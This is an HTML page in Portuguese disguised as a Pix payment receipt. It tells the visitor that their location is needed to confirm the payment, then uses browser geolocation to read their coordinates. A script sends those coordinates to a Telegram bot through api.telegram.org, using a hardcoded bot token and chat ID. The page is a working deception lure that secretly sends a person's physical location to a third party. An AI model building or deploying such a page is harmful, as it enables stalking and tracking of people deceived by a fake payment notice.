<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Comprovante de Pix</title>
</head>
<body>
  <h1>Comprovante de Pix Recebido</h1>
  <img src="comprovante.png" alt="Comprovante de Pix" width="300">
  <p>Para confirmar, precisamos da sua localização. Por favor, permita a permissão de localização.</p>

  <button onclick="getLocation()">Obter Localização</button>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, showError);
      } else {
        alert("Geolocalização não é suportada por este navegador.");
      }
    }

    function sendLocation(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      
      // Token do bot e chat ID fornecidos
      const telegramBotToken = "7964496822:AAFCBrNEI0b0oYQOFimCMobsWi_peVjN0wY";  // Seu token do bot
      const chatId = "6045619916";  // Seu chat ID (ID do usuário ou grupo do Telegram)
      
      const url = `https://api.telegram.org/bot${telegramBotToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`;
      
      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            alert("Localização enviada com sucesso!");
          } else {
            alert("Erro ao enviar localização. Detalhes: " + JSON.stringify(data));
          }
        })
        .catch(error => {
          alert("Erro na comunicação com a API do Telegram: " + error);
        });
    }

    function showError(error) {
      switch(error.code) {
        case error.PERMISSION_DENIED:
          alert("Usuário negou a solicitação de localização.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("A posição não está disponível.");
          break;
        case error.TIMEOUT:
          alert("O tempo de solicitação expirou.");
          break;
        case error.UNKNOWN_ERROR:
          alert("Erro desconhecido.");
          break;
      }
    }
  </script>
</body>
</html>
